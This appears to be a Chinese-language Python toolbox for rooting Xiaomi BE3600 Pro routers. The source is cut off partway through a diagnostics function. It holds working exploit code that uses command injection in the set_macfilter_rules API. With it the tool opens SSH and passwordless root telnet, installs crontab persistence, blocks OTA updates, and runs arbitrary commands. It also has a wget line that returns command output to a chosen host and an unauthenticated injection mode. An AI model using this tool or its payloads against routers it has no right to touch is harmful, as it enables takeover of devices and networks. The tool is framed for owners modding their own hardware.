#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
小米 BE3600 Pro (RP01 / RP02) 一键 Root & 运维管理交互式工具箱
兼容: Python 2.7 / Python 3.x
跨平台支持: macOS / Windows / Linux
"""
from __future__ import print_function

import sys
import os
import re
import time
import socket
import subprocess
import shutil
import warnings
import io

# 过滤底层 SSL/urllib3 版本提示警告，保持控制台整洁
warnings.filterwarnings("ignore")

# Python 2/3 输入与 Windows 控制台中文编码自适应兼容
if sys.platform == "win32":
    try:
        os.system("")
    except Exception:
        pass

    if sys.version_info[0] < 3:
        import ctypes
        from ctypes import wintypes

        try:
            _GetStdHandle = ctypes.windll.kernel32.GetStdHandle
            _WriteConsoleW = ctypes.windll.kernel32.WriteConsoleW
            _STD_OUTPUT_HANDLE = -11
            _STD_ERROR_HANDLE = -12
            _h_stdout = _GetStdHandle(_STD_OUTPUT_HANDLE)
            _h_stderr = _GetStdHandle(_STD_ERROR_HANDLE)
            _has_win32_console = True
        except Exception:
            _has_win32_console = False

        class _WinPy2UnicodeStream(object):
            """使用 Windows 原生 WriteConsoleW 实现真实 Unicode 渲染，彻底解决乱码与问号"""
            def __init__(self, raw_stream, handle):
                self._stream = raw_stream
                self._handle = handle
                self._written = wintypes.DWORD() if _has_win32_console else None

            def write(self, s):
                if not s:
                    return
                if not isinstance(s, unicode):
                    try:
                        u = s.decode("utf-8")
                    except Exception:
                        try:
                            u = s.decode("gbk", "replace")
                        except Exception:
                            u = unicode(s)
                else:
                    u = s

                # 优先使用 Windows 原生 Unicode 控制台 API，直接突破当前代码页限制
                if _has_win32_console and self._handle:
                    res = _WriteConsoleW(
                        self._handle,
                        u,
                        len(u),
                        ctypes.byref(self._written),
                        None
                    )
                    if res:
                        return

                # 降级模式（如重定向输出或管道）
                enc = getattr(self._stream, "encoding", None) or "gbk"
                if enc.lower().replace("-", "") in ("cp437", "437", "ascii", "usascii"):
                    enc = "gbk"
                try:
                    self._stream.write(u.encode(enc, "replace"))
                except Exception:
                    try:
                        self._stream.write(u.encode("utf-8", "replace"))
                    except Exception:
                        self._stream.write(s if isinstance(s, str) else "")

            def flush(self):
                try:
                    self._stream.flush()
                except Exception:
                    pass

            def __getattr__(self, name):
                return getattr(self._stream, name)

        sys.stdout = _WinPy2UnicodeStream(sys.stdout, _h_stdout if _has_win32_console else None)
        sys.stderr = _WinPy2UnicodeStream(sys.stderr, _h_stderr if _has_win32_console else None)

        def _safe_py2_input(prompt=""):
            if prompt:
                sys.stdout.write(prompt)
                sys.stdout.flush()
            val = raw_input()
            enc = getattr(sys.stdin, "encoding", None) or "gbk"
            if enc.lower().replace("-", "") in ("cp437", "437", "ascii"):
                enc = "gbk"
            try:
                return val.decode(enc, "replace").encode("utf-8")
            except Exception:
                return val

        input = _safe_py2_input
    else:
        # Python 3 on Windows
        try:
            if hasattr(sys.stdout, "reconfigure"):
                sys.stdout.reconfigure(encoding="utf-8", errors="replace")
            if hasattr(sys.stderr, "reconfigure"):
                sys.stderr.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass
else:
    if sys.version_info[0] < 3:
        input = raw_input


class Color:
    """跨平台 ANSI 终端颜色"""
    ENABLED = True

    HEADER = "\033[95m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"

    @classmethod
    def strip(cls, text):
        return re.sub(r"\033\[[0-9;]*m", "", text)


def c(color, text):
    if not Color.ENABLED:
        return text
    return "{0}{1}{2}".format(color, text, Color.RESET)


def clear_screen():
    """跨平台清屏"""
    try:
        os.system("cls" if sys.platform == "win32" else "clear")
    except Exception:
        print("\n" * 20)


def set_terminal_title(title):
    """跨平台设置终端标题"""
    try:
        if sys.platform == "win32":
            if sys.version_info[0] < 3 and isinstance(title, str):
                try:
                    title_bytes = title.decode("utf-8").encode("gbk", "replace")
                except Exception:
                    title_bytes = title
            else:
                title_bytes = title
            os.system("title {0}".format(title_bytes))
        else:
            sys.stdout.write("\033]0;{0}\007".format(title))
            sys.stdout.flush()
    except Exception:
        pass


def which_cmd(cmd):
    """跨平台查找可执行文件（兼容 Python 2/3）"""
    if hasattr(shutil, "which"):
        return shutil.which(cmd)
    for p in os.environ.get("PATH", "").split(os.pathsep):
        full = os.path.join(p, cmd)
        if os.path.isfile(full) and os.access(full, os.X_OK):
            return full
        if sys.platform == "win32" and os.path.isfile(full + ".exe"):
            return full + ".exe"
    return None


def check_requests_installed():
    """检查是否安装了 requests 库（非必需，内置 urllib 同样可用）"""
    try:
        import requests
        return True
    except ImportError:
        return False


def install_requests_optional():
    """可选的高速镜像安装 requests"""
    print(c(Color.CYAN, "[*] 正在通过清华镜像源安装 requests..."))
    cmd = [
        sys.executable, "-m", "pip", "install",
        "-i", "https://pypi.tuna.tsinghua.edu.cn/simple",
        "requests"
    ]
    ret = subprocess.call(cmd)
    if ret == 0:
        print(c(Color.GREEN, "[+] requests 安装成功！\n"))
        return True
    else:
        print(c(Color.YELLOW, "[*] 镜像源未完成，尝试默认源安装..."))
        ret2 = subprocess.call([sys.executable, "-m", "pip", "install", "requests"])
        return ret2 == 0


# 导入项目自带 tools
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TOOLS_DIR = os.path.join(SCRIPT_DIR, "tools")
if TOOLS_DIR not in sys.path:
    sys.path.insert(0, TOOLS_DIR)
if SCRIPT_DIR not in sys.path:
    sys.path.insert(0, SCRIPT_DIR)

try:
    from tools.calc_root_pwd import root_pwd, selftest as run_selftest
    import tools.recv_backup as recv_backup_mod
    from tools.exploit_set_macfilter_rules import (
        Router,
        build_payload,
        DROPBEAR_CMDS,
        TELNET_CMDS,
        get_persist_cmd,
        _local_ip,
    )
except ImportError:
    pass


class Context:
    """运行时上下文：会话级持久记住配置与密码"""
    def __init__(self):
        self.router_ip = "192.168.31.1"
        self.ip_configured = False   # 是否已在会话中输入或确认过
        self.web_password = None     # None 表示尚未输入过
        self.sn = ""
        self.root_pwd = ""
        self.device_info = ""

    def summary(self):
        sn_disp = c(Color.CYAN, self.sn) if self.sn else c(Color.DIM, "后台自动获取")
        pwd_disp = c(Color.GREEN + Color.BOLD, self.root_pwd) if self.root_pwd else c(Color.DIM, "算号/开SSH后显示")
        if self.web_password is None:
            web_disp = c(Color.DIM, "未设置")
        elif self.web_password == "":
            web_disp = c(Color.YELLOW, "空密码(已记住)")
        else:
            web_disp = c(Color.GREEN, "已记住")
        ip_disp = c(Color.CYAN, self.router_ip) if self.ip_configured else c(Color.DIM, "{0}(默认)".format(self.router_ip))
        dev_str = " | 设备: {0}".format(c(Color.BOLD, self.device_info)) if self.device_info else ""
        return "目标IP: {0}{1} | 设备SN: {2} | Root密码: {3} | WEB密码: {4}".format(
            ip_disp, dev_str, sn_disp, pwd_disp, web_disp
        )


ctx = Context()


def get_credentials(force=False):
    """
    获取路由器 IP 与 WEB 密码。
    用户在当前会话只要输入过一次，就一直记住，后续直接使用，除非 force=True 或主动重设。
    """
    if force or not ctx.ip_configured:
        default_ip = ctx.router_ip or "192.168.31.1"
        ip_in = input("请输入路由器 IP [回车默认 {0}]: ".format(default_ip)).strip()
        ctx.router_ip = ip_in if ip_in else default_ip
        ctx.ip_configured = True

    if force or ctx.web_password is None:
        print(c(Color.CYAN, "[*] 提示: 路由器 WEB 管理密码是你在后台或米家首次配网设的登录密码（并非 WiFi 密码）。"))
        pwd_in = input("请输入路由器 WEB 管理密码 (若从没设过就直接回车): ").strip()
        ctx.web_password = pwd_in


def pause():
    input("\n{0}".format(c(Color.DIM, "按回车键继续...")))


def test_port(ip, port, timeout=1.5):
    """测试指定 IP:Port 是否开放"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        res = s.connect_ex((ip, port))
        return res == 0
    except Exception:
        return False
    finally:
        s.close()


def detect_local_ip(target_ip):
    """检测连接目标路由器时的本机局域网 IP"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.settimeout(1.0)
        s.connect((target_ip, 80))
        return s.getsockname()[0]
    except Exception:
        pass
    finally:
        s.close()

    # UDP 探测兜底
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target_ip, 80))
        return s.getsockname()[0]
    except Exception:
        return "192.168.31.100"
    finally:
        s.close()


# ==============================================================================
# 功能 1: 计算 Root 密码
# ==============================================================================
def menu_calc_pwd():
    print(c(Color.BOLD, "\n--- [1] 计算设备 Root 密码 (基于 SN) ---"))
    print("原理: 小米出厂用 MD5(SN + 固件固定盐) 前8位作为 root 密码。")

    # 如果当前会话已从后台自动读取到 SN
    if ctx.sn and ctx.root_pwd:
        print("\n" + "=" * 60)
        if ctx.device_info:
            print("设备型号    : {0}".format(c(Color.BOLD, ctx.device_info)))
        print("设备 SN     : {0} (已从路由器后台 API 自动读取)".format(c(Color.CYAN, ctx.sn)))
        print("用户名      : {0}".format(c(Color.BOLD, "root")))
        print("Root 密码   : {0}".format(c(Color.GREEN + Color.BOLD, ctx.root_pwd)))
        print("=" * 60)
        ans = input("\n是否需要手动输入其他 SN 进行计算？(y/N): ").strip().lower()
        if ans != "y":
            pause()
            return

    print("\n请选择计算方式:")
    print("  1. 自动连接路由器获取 SN 并计算密码 (推荐，免查铭牌，只需后台密码)")
    print("  2. 手工输入 SN 计算 (离线模式，需查看路由器底部铭牌或包装盒)")
    print("  0. 返回主菜单")
    opt = input("\n请选择 (0-2) [回车默认 1]: ").strip() or "1"

    if opt == "1":
        get_credentials()
        print("\n[*] 正在连接 {0} 并读取后台设备信息...".format(ctx.router_ip))
        try:
            gw = Router(ctx.router_ip, ctx.web_password)
            if not gw.detect():
                pause()
                return
            if not gw.login():
                print(c(Color.RED, "[-] 登录失败，请确认 WEB 管理密码。"))
                ans = input("是否修改已记住的 IP 或密码？(y/N): ").strip().lower()
                if ans == "y":
                    get_credentials(force=True)
                pause()
                return

            if gw.sn:
                ctx.sn = gw.sn
                ctx.root_pwd = root_pwd(gw.sn)
                if gw.displayName:
                    ctx.device_info = "{0} ({1})".format(gw.displayName, gw.hardware or "Xiaomi")
                print("\n" + "=" * 60)
                if ctx.device_info:
                    print("设备型号    : {0}".format(c(Color.BOLD, ctx.device_info)))
                print("设备 SN     : {0} (已从后台 API 自动获取)".format(c(Color.CYAN, ctx.sn)))
                print("用户名      : {0}".format(c(Color.BOLD, "root")))
                print("Root 密码   : {0}".format(c(Color.GREEN + Color.BOLD, ctx.root_pwd)))
                print("=" * 60)
                print(c(Color.GREEN, "[✓] 已成功从路由器获取 SN 并计算出 Root 密码！当前会话已记住。"))

                ans = input("\n是否立即执行 [2] 开启路由器 SSH 访问？(Y/n): ").strip().lower()
                if ans != "n":
                    menu_exploit_ssh()
                    return
            else:
                print(c(Color.YELLOW, "[!] 成功登录，但后台未返回有效 SN，可选择方式 2 手动输入。"))
        except Exception as e:
            print(c(Color.RED, "[-] 连接异常: {0}".format(e)))
        pause()

    elif opt == "2":
        sn = input("\n请输入路由器 SN (形如 12345/A1B2C3D4E5F6，斜杠必须保留): ").strip()
        if not sn:
            print("[-] 未输入 SN，返回主菜单。")
            pause()
            return

        if "/" not in sn:
            print(c(Color.YELLOW, "[!] 警告: 输入的 SN '{0}' 不含 '/' 符号！".format(sn)))
            print("    小米路由器的 SN 通常格式为 12345/A1B2C3D4E5F6。")
            confirm = input("确定继续使用该 SN 计算吗？(y/N): ").strip().lower()
            if confirm != "y":
                return

        pwd = root_pwd(sn)
        ctx.sn = sn
        ctx.root_pwd = pwd

        print("\n" + "=" * 60)
        print("设备 SN      : {0}".format(c(Color.CYAN, sn)))
        print("用户名       : {0}".format(c(Color.BOLD, "root")))
        print("Root 密码    : {0}".format(c(Color.GREEN + Color.BOLD, pwd)))
        print("=" * 60)
        print(c(Color.DIM, "注意: SN 与算出的密码属于你的设备隐私，请勿泄露给他人。"))

        ans = input("\n是否立即执行 [2] 开启路由器 SSH 访问？(Y/n): ").strip().lower()
        if ans != "n":
            menu_exploit_ssh()
        else:
            pause()


# ==============================================================================
# 功能 2: 一键开启 SSH 访问
# ==============================================================================
def menu_exploit_ssh():
    print(c(Color.BOLD, "\n--- [2] 漏洞利用: 一键开启 SSH (Dropbear 22 端口) ---"))
    print("适用机型: 小米 BE3600 Pro (RP01/RP02) / 万兆路由器 / AX 系列等")
    print("利用接口: /cgi-bin/luci/api/xqsystem/set_macfilter_rules 命令注入")

    get_credentials()

    pwd_show = '(空/未设置)' if not ctx.web_password else '*' * len(ctx.web_password)
    print("\n[*] 目标路由器: {0}".format(c(Color.CYAN, ctx.router_ip)))
    print("[*] WEB 密码  : {0}".format(pwd_show))
    print("[*] 正在连接路由器并识别设备型号...")

    try:
        gw = Router(ctx.router_ip, ctx.web_password)
        if not gw.detect():
            ans = input("无法连接路由器，是否需要修改记住的 IP 地址？(y/N): ").strip().lower()
            if ans == "y":
                get_credentials(force=True)
            pause()
            return
        
        print("[*] 正在尝试登录路由器后台 (Nonce/明文 双路径自动探测)...")
        if not gw.login():
            print(c(Color.RED, "[-] 四种登录方式均失败！"))
            print("    排查建议:")
            print("    1. 请确认路由器 WEB 管理密码是否正确（注意不是 WiFi 密码或小米账号密码）。")
            print("    2. 如果路由器尚未完成初始化配置，请先在手机米家或网页配置完成。")
            ans = input("是否需要修改已记住的 IP 或 WEB 密码？(y/N): ").strip().lower()
            if ans == "y":
                get_credentials(force=True)
            pause()
            return

        print(c(Color.GREEN, "[+] 登录成功！获取到 stok={0}".format(gw.stok)))

        # 核心增强: 自动从 API init_info 读取 SN 并计算 root 密码
        if gw.sn:
            ctx.sn = gw.sn
            ctx.root_pwd = root_pwd(gw.sn)
            if gw.displayName:
                ctx.device_info = "{0} ({1})".format(gw.displayName, gw.hardware or "Xiaomi")
            print(c(Color.GREEN, "[+] 自动读取设备 SN: {0} (Root 密码已自动算得)".format(ctx.sn)))

        print("[*] 正在注入命令以启动 Dropbear SSH 服务 (规避 0 字节 host_key 缺陷)...")

        payload = build_payload("\n".join(DROPBEAR_CMDS))
        import random
        mac = ("02:%02X:%02X:%02X:%02X:%02X" % tuple(random.randint(0, 255) for _ in range(5)))
        resp = gw.inject(payload, mac, "0")

        print("[*] 等待路由器服务启动 (2 秒)...")
        time.sleep(2)

        # 端口自测
        is_open = test_port(ctx.router_ip, 22, timeout=2.0)
        
        # 无论端口检测结果如何，始终高亮清晰打印 SSH 登录账号与自动算出的密码
        print("\n" + "=" * 64)
        if is_open:
            print(c(Color.GREEN + Color.BOLD, "[✓] 恭喜！SSH 服务已成功开启并在 22 端口就绪！"))
        else:
            print(c(Color.YELLOW + Color.BOLD, "[✓] 注入指令已成功发送！(若 22 端口稍有延迟，稍等几秒即可)"))
        print("-" * 64)
        if ctx.device_info:
            print("设备型号 : {0}".format(c(Color.BOLD, ctx.device_info)))
        if ctx.sn:
            print("设备 SN  : {0} (已从路由器后台 API 自动读取，免查铭牌)".format(c(Color.CYAN, ctx.sn)))
        print("SSH 账号 : {0}".format(c(Color.BOLD, "root")))
        if ctx.root_pwd:
            print("Root密码 : {0} (已根据 SN 自动计算完成)".format(c(Color.GREEN + Color.BOLD, ctx.root_pwd)))
        else:
            print(c(Color.YELLOW, "Root密码 : 暂未获取到 SN，请在菜单 [1] 输入计算"))
        print("目标地址 : {0}:22".format(ctx.router_ip))
        print("\n快速登录命令:")
        print(c(Color.CYAN, "  ssh -o HostKeyAlgorithms=+ssh-rsa root@{0}".format(ctx.router_ip)))
        print("=" * 64)

        ans = input("\n是否立即发起 SSH 登录？(Y/n): ").strip().lower()
        if ans != "n":
            menu_connect_ssh()
        else:
            pause()

    except Exception as e:
        print(c(Color.RED, "[-] 发生异常: {0}".format(e)))
        pause()


# ==============================================================================
# 功能 3: 安全只读探测
# ==============================================================================
def menu_probe():
    print(c(Color.BOLD, "\n--- [3] 安全探测: 漏洞只读验证 (--probe) ---"))
    print("说明: 本操作仅让路由器向你的电脑发送 1 个 ICMP Ping 包，不写入任何改动。")
    print("      收到来自路由器的 ICMP 包即可证明命令注入成立。")

    get_credentials()

    local_ip = detect_local_ip(ctx.router_ip)
    tgt_ip = input("你的电脑接收 IP [回车默认 {0}]: ".format(local_ip)).strip() or local_ip

    print(c(Color.CYAN, "\n[提示] 请在电脑另开一个终端窗口运行抓包命令:"))
    if sys.platform == "darwin":
        print(c(Color.BOLD, "  sudo tcpdump -i any icmp and host {0}".format(ctx.router_ip)))
    elif sys.platform == "win32":
        print(c(Color.BOLD, "  使用 Wireshark 抓包过滤: icmp"))
    else:
        print(c(Color.BOLD, "  sudo tcpdump -i any icmp and host {0}".format(ctx.router_ip)))

    input("\n准备好后，按回车键开始向路由器发起测试请求...")

    try:
        gw = Router(ctx.router_ip, ctx.web_password)
        if not gw.detect():
            pause()
            return
        if not gw.login():
            print(c(Color.YELLOW, "[*] 登录失败，尝试无鉴权模式探测..."))
        
        cmd = "ping -c 1 -W 1 {0}".format(tgt_ip)
        payload = build_payload(cmd)
        import random
        mac = ("02:%02X:%02X:%02X:%02X:%02X" % tuple(random.randint(0, 255) for _ in range(5)))
        gw.inject(payload, mac, "0")
        print(c(Color.GREEN, "\n[+] 探测命令已下发 (ping {0})。请查看抓包窗口是否有 ICMP 请求包。".format(tgt_ip)))
    except Exception as e:
        print(c(Color.RED, "[-] 探测异常: {0}".format(e)))

    pause()


# ==============================================================================
# 功能 4: SSH 终端连接
# ==============================================================================
def menu_connect_ssh():
    print(c(Color.BOLD, "\n--- [4] SSH 终端: 连接路由器 ---"))
    
    # 检测 22 端口
    print("[*] 正在检测 {0}:22 ...".format(ctx.router_ip))
    if not test_port(ctx.router_ip, 22, timeout=1.5):
        print(c(Color.YELLOW, "[!] 警告: {0} 的 22 端口当前未开放！".format(ctx.router_ip)))
        print("    请先在主菜单执行 [2] 开启 SSH 服务。")
        ans = input("仍然尝试连接吗？(y/N): ").strip().lower()
        if ans != "y":
            return

    ssh_cmd = [
        "ssh",
        "-o", "HostKeyAlgorithms=+ssh-rsa",
        "-o", "PubkeyAcceptedAlgorithms=+ssh-rsa",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "root@{0}".format(ctx.router_ip),
    ]

    cmd_str = " ".join(ssh_cmd)
    print("\n标准连接命令 (已自动包含针对 dropbear 2017 的兼容算法参数):")
    print(c(Color.CYAN, "  {0}".format(cmd_str)))

    if ctx.root_pwd:
        print("\n登录用户名 : {0}".format(c(Color.BOLD, "root")))
        print("Root 密码  : {0} (在下方密码提示时输入/粘贴)".format(c(Color.GREEN + Color.BOLD, ctx.root_pwd)))
    else:
        print(c(Color.YELLOW, "\n提示: 未在工具箱中计算 Root 密码，可先在主菜单执行 [2] 开启 SSH 并自动获取密码。"))

    # 检查本地是否有 ssh 命令
    if not which_cmd("ssh"):
        print(c(Color.RED, "[-] 未在系统中找到 ssh 命令行工具，请复制上方命令在支持 SSH 的终端中运行。"))
        pause()
        return

    ans = input("\n是否直接在本终端中拉起 SSH 登录会话？(Y/n): ").strip().lower()
    if ans != "n":
        print(c(Color.GREEN, "[*] 正在启动 SSH 会话 (退出路由器后将自动返回本工具箱)...\n"))
        try:
            subprocess.call(ssh_cmd)
        except Exception as e:
            print(c(Color.RED, "[-] 启动 SSH 失败: {0}".format(e)))
        print("\n[*] SSH 会话已结束。")
    pause()


# ==============================================================================
# 功能 5: 持久化与防静默 OTA
# ==============================================================================
def menu_persistence():
    print(c(Color.BOLD, "\n--- [5] 一键持久化: 固化 SSH 访问 & 关闭静默 OTA 升级 ---"))
    print("说明: 本功能将【全自动】向路由器注入部署持久化脚本:")
    print("  1. 固化 dropbear RSA host_key 到 /data/ssh/")
    print("  2. 建立开机启动守护脚本 /data/ssh/boot.sh")
    print("  3. 配置 /etc/crontabs/root 每分钟守护，并剔除凌晨 otapredownload 任务防静默升级")
    print("  4. 写入 nvram (ssh_en=1, telnet_en=1, uart_en=1) 跨重启生效\n")

    get_credentials()

    ans = input("目标路由器 [{0}]，是否立即执行持久化？(Y/n): ".format(ctx.router_ip)).strip().lower()
    if ans == "n":
        print("[-] 已取消。")
        pause()
        return

    print("[*] 正在连接路由器并验证登录...")
    try:
        gw = Router(ctx.router_ip, ctx.web_password)
        if not gw.detect():
            pause()
            return
        if not gw.login():
            print(c(Color.RED, "[-] 登录失败，请确认输入的 WEB 管理密码是否正确。"))
            ans = input("是否需要修改已记住的 IP 或密码？(y/N): ").strip().lower()
            if ans == "y":
                get_credentials(force=True)
            pause()
            return

        # 尝试自动从 init_info 提取 SN 并计算密码
        if gw.sn:
            ctx.sn = gw.sn
            ctx.root_pwd = root_pwd(gw.sn)
            if gw.displayName:
                ctx.device_info = "{0} ({1})".format(gw.displayName, gw.hardware or "Xiaomi")

        print("[*] 正在向路由器下发全套持久化配置...")
        payload = build_payload(get_persist_cmd())
        import random
        mac = ("02:%02X:%02X:%02X:%02X:%02X" % tuple(random.randint(0, 255) for _ in range(5)))
        gw.inject(payload, mac, "0")

        print("[*] 等待 2 秒后检测持久化后的 22 端口服务状态...")
        time.sleep(2)
        print("\n" + "=" * 64)
        if test_port(ctx.router_ip, 22, timeout=2.0):
            print(c(Color.GREEN + Color.BOLD, "[✓] 自动持久化配置成功！22 端口运行正常！"))
        else:
            print(c(Color.YELLOW + Color.BOLD, "[✓] 持久化指令已发送成功！"))
        print("-" * 64)
        if ctx.device_info:
            print("设备型号 : {0}".format(c(Color.BOLD, ctx.device_info)))
        if ctx.sn:
            print("设备 SN  : {0} (已从后台 API 自动读取)".format(c(Color.CYAN, ctx.sn)))
        print("SSH 账号 : {0}".format(c(Color.BOLD, "root")))
        if ctx.root_pwd:
            print("Root密码 : {0}".format(c(Color.GREEN + Color.BOLD, ctx.root_pwd)))
        print(c(Color.GREEN, "\n路由器重启后将在 1 分钟内由 crontab 自动守护拉起 SSH，夜间静默升级已被阻断。"))
        print("=" * 64)
    except Exception as e:
        print(c(Color.RED, "[-] 执行异常: {0}".format(e)))

    pause()


# ==============================================================================
# 功能 6: Flash 分区备份助手
# ==============================================================================
def menu_backup():
    print(c(Color.BOLD, "\n--- [6] Flash 备份: 启动备份服务器 & 生成路由器备份命令 ---"))
    print(c(Color.YELLOW, "【重要警告】ART 分区 (mtd16，无线校准) 和 bdata 分区 (mtd21，序列号与密钥)"))
    print("一旦丢失，官方固件均无法补回！备份是唯一的后悔药，强烈建议备份并妥善保存。\n")

    local_ip = detect_local_ip(ctx.router_ip)
    my_ip = input("本机局域网 IP [回车默认 {0}]: ".format(local_ip)).strip() or local_ip
    port_in = input("接收端口 [回车默认 8001]: ").strip() or "8001"
    try:
        port = int(port_in)
    except ValueError:
        port = 8001

    out_dir_in = input("备份保存目录 [回车默认 ./rp01_backup]: ").strip() or "./rp01_backup"
    out_dir = os.path.abspath(out_dir_in)

    # 路由器侧备份命令
    router_cmd = (
        "for m in 0 1 2 3 4 5 13 14 16 17 18 21; do "
        "dd if=/dev/mtdblock$m of=/tmp/m.bin bs=65536 2>/dev/null; "
        "base64 /tmp/m.bin > /tmp/m.b64; "
        "wget -q --post-file=/tmp/m.b64 -O /dev/null http://{0}:{1}/mtd$m.b64; "
        "rm -f /tmp/m.bin /tmp/m.b64; "
        "done".format(my_ip, port)
    )

    print("\n" + "=" * 65)
    print(c(Color.YELLOW, "请在路由器 SSH 终端中粘贴执行以下这行备份指令:"))
    print("=" * 65)
    print(c(Color.CYAN, router_cmd))
    print("=" * 65)
    print(c(Color.DIM, "备份文件将保存到: {0}".format(out_dir)))
    print(c(Color.DIM, "接收服务将在此窗口运行并校验分区大小（12 个分区全部显示 [OK] 即完整）。"))
    print(c(Color.DIM, "传输完成后按 Ctrl+C 即可停止监听并返回主菜单。\n"))

    ans = input("是否立即在本机启动接收服务？(Y/n): ").strip().lower()
    if ans != "n":
        try:
            recv_backup_mod.run_server(out_dir, port)
        except Exception as e:
            print(c(Color.RED, "[-] 接收服务异常: {0}".format(e)))
        pause()


# ==============================================================================
# 功能 7: 高级工具 (自定义命令 / 开启 Telnet)
# ==============================================================================
def menu_advanced():
    print(c(Color.BOLD, "\n--- [7] 高级功能: 自定义 Shell 命令 / 临时 Telnet ---"))
    print("1. 执行单条自定义 Shell 命令")
    print("2. 开启 Telnet (23 端口，免密 root shell)")
    print("3. 无鉴权直打模式 (--no-auth，需要所有权声明)")
    print("0. 返回主菜单")
    
    choice = input("\n请选择功能 (0-3): ").strip()
    if choice == "1":
        get_credentials()
        cmd = input("请输入要由路由器执行的 Shell 命令 (如 'uptime' 或 'uname -a'): ").strip()
        if not cmd:
            return
        local_ip = detect_local_ip(ctx.router_ip)
        exfil = input("是否通过 HTTP 回传输出？如需要请输入本机接收地址 [回车跳过/或如 {0}:8000]: ".format(local_ip)).strip()
        
        gw = Router(ctx.router_ip, ctx.web_password)
        if not gw.detect() or not gw.login():
            print(c(Color.RED, "[-] 连接或登录失败。"))
            pause()
            return

        if exfil:
            host, _, port = exfil.partition(":")
            port = port or "8000"
            exec_cmd = ('wget -O /dev/null http://%s:%s/$(%s 2>&1 | tr -c "A-Za-z0-9.:/_-" _)'
                        % (host, port, cmd))
            print("[*] 请确保已在 {0} 运行: python -m http.server {1}".format(host, port))
        else:
            exec_cmd = cmd

        payload = build_payload(exec_cmd)
        import random
        mac = ("02:%02X:%02X:%02X:%02X:%02X" % tuple(random.randint(0, 255) for _ in range(5)))
        gw.inject(payload, mac, "0")
        print(c(Color.GREEN, "[+] 命令已注入执行。"))
        pause()

    elif choice == "2":
        get_credentials()
        print("[*] 正在向路由器下发启动 telnetd 指令...")
        gw = Router(ctx.router_ip, ctx.web_password)
        if not gw.detect() or not gw.login():
            print(c(Color.RED, "[-] 连接或登录失败。"))
            pause()
            return
        payload = build_payload("\n".join(TELNET_CMDS))
        import random
        mac = ("02:%02X:%02X:%02X:%02X:%02X" % tuple(random.randint(0, 255) for _ in range(5)))
        gw.inject(payload, mac, "0")
        time.sleep(1)
        if test_port(ctx.router_ip, 23):
            print(c(Color.GREEN, "[✓] Telnet 23 端口已开启！连接方式: telnet {0}".format(ctx.router_ip)))
        else:
            print(c(Color.YELLOW, "[!] Telnet 指令已下发（注：固件稳定版可能存在 ft_mode/release 检查阻断，若连不上推荐使用 Dropbear SSH 方式）。"))
        pause()

    elif choice == "3":
        print(c(Color.YELLOW, "\n[安全警示] --no-auth 仅限用于你自己拥有且有权测试的设备。"))
        confirm = input("确认目标设备 {0} 为你本人所有？输入 yes 继续: ".format(ctx.router_ip)).strip()
        if confirm.lower() != "yes":
            print("[-] 已取消。")
            pause()
            return
        cmd = input("请输入要执行的命令 [回车默认开启 SSH]: ").strip()
        if not cmd:
            cmd = "\n".join(DROPBEAR_CMDS)
        gw = Router(ctx.router_ip, "")
        gw.detect()
        payload = build_payload(cmd)
        import random
        mac = ("02:%02X:%02X:%02X:%02X:%02X" % tuple(random.randint(0, 255) for _ in range(5)))
        gw.inject(payload, mac, "0")
        print(c(Color.GREEN, "[+] 无鉴权请求已下发。"))
        pause()


# ==============================================================================
# 功能 8: 写入系统 ~/.ssh/config 快速别名
# ==============================================================================
def menu_ssh_config():
    print(c(Color.BOLD, "\n--- [8] 本地配置: 写入 ~/.ssh/config 便捷别名 ---"))
    print("配置后，你在本机任何终端里只需输入 " + c(Color.GREEN, "ssh miwifi") + " 即可一秒直连路由器！")
    print("再也无需手动记忆和输入长串的 `-o HostKeyAlgorithms=+ssh-rsa` 等参数。")

    home = os.path.expanduser("~")
    ssh_dir = os.path.join(home, ".ssh")
    config_path = os.path.join(ssh_dir, "config")

    config_block = """
# Xiaomi Router (RP01 / RP02)
Host miwifi
    HostName {0}
    User root
    HostKeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    LogLevel QUIET
""".format(ctx.router_ip)

    print("\n将添加的配置内容:")
    print(c(Color.CYAN, config_block.strip()))
    print("\n目标文件: {0}".format(config_path))

    # 检测是否已有 Host miwifi
    if os.path.isfile(config_path):
        try:
            with io.open(config_path, "r", encoding="utf-8") as f:
                content = f.read()
            if "Host miwifi" in content:
                print(c(Color.YELLOW, "\n[!] 提示: 检测到你的 ~/.ssh/config 中已经存在 `Host miwifi` 配置。"))
                ans = input("是否覆盖或追加？(y/N): ").strip().lower()
                if ans != "y":
                    pause()
                    return
        except Exception:
            pass

    ans = input("\n是否确认写入到本地 SSH 配置文件？(Y/n): ").strip().lower()
    if ans != "n":
        try:
            if not os.path.exists(ssh_dir):
                try:
                    os.makedirs(ssh_dir)
                except OSError:
                    pass
            with io.open(config_path, "a", encoding="utf-8") as f:
                f.write(config_block)
            if sys.platform != "win32":
                try:
                    os.chmod(config_path, 0o600)
                except Exception:
                    pass
            print(c(Color.GREEN, "\n[✓] 写入成功！现在你可以直接在任何终端中输入: ssh miwifi"))
        except Exception as e:
            print(c(Color.RED, "[-] 写入失败: {0}".format(e)))
    pause()


# ==============================================================================
# 功能 9: 环境与连通性检测
# ==============================================================================
def menu_diag():
    print(c(Color.BOLD, "\n--- [9] 环境检测: 局域网连通性 & 路由器端口诊断 ---"))
    
    print("[*] 目标路由器 IP: {0}".format(ctx.router_ip))
    local_ip = detect_local_ip(ctx.router_ip)
    print("[*] 本机局域网 IP: {0}".format(local_ip))

    # Ping 探测
    print("\n[*] 正在 Ping {0} ...".format(ctx.router_ip))
    ping_cmd = ["ping", "-n", "2", ctx.router_ip] if sys.platform == "win32" else ["ping", "-c", "2", "-W", "2", ctx.router_ip]
    try:
        p = subprocess.Popen(ping_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
